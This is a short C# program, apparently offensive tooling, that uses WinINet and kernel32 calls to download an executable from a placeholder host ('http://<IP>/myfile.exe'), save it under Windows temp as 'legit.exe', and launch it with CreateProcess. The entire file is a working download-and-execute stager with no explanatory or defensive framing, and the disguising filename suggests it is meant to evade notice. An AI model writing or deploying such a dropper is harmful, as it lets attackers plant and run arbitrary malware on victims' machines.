using System;
using System.Runtime.InteropServices;

class Program {
    // Import WinINet functions
    [DllImport("wininet.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    public static extern IntPtr InternetOpenA(string lpszAgent, int dwAccessType, string lpszProxy, string lpszProxyBypass, int dwFlags);

    [DllImport("wininet.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    public static extern IntPtr InternetOpenUrlA(IntPtr hInternet, string lpszUrl, string lpszHeaders, int dwHeadersLength, uint dwFlags, IntPtr dwContext);

    [DllImport("wininet.dll", SetLastError = true)]
    public static extern bool InternetReadFile(IntPtr hFile, byte[] lpBuffer, int dwNumberOfBytesToRead, out int lpdwBytesRead);

    [DllImport("wininet.dll", SetLastError = true)]
    public static extern bool InternetCloseHandle(IntPtr hInternet);

    // Import Process functions
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO { public uint cb; public string lpReserved; public string lpDesktop; public string lpTitle; public uint dwX; public uint dwY; public uint dwXSize; public uint dwYSize; public uint dwXCountChars; public uint dwYCountChars; public uint dwFillAttribute; public uint dwFlags; public ushort wShowWindow; public ushort cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION { public IntPtr hProcess; public IntPtr hThread; public uint dwProcessId; public uint dwThreadId; }

    static void Main() {
        // 1. Initialize Internet
        IntPtr hInternet = InternetOpenA("Download Example", 1, null, null, 0);
        
        // 2. Open URL
        IntPtr hConnect = InternetOpenUrlA(hInternet, "http://<IP>/myfile.exe", null, 0, 0x80000000, IntPtr.Zero);

        // 3. Download and Write
        using (var fs = new System.IO.FileStream("c:\\windows\\temp\\legit.exe", System.IO.FileMode.Create)) {
            byte[] buffer = new byte[1024];
            int bytesRead;
            while (InternetReadFile(hConnect, buffer, buffer.Length, out bytesRead) && bytesRead > 0) {
                fs.Write(buffer, 0, bytesRead);
            }
        }

        // 4. Cleanup Handles
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);

        // 5. Create Process
        STARTUPINFO si = new STARTUPINFO();
        si.cb = (uint)Marshal.SizeOf(si);
        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
        CreateProcess(null, "c:\\windows\\temp\\legit.exe", IntPtr.Zero, IntPtr.Zero, false, 0, IntPtr.Zero, null, ref si, out pi);
    }
}
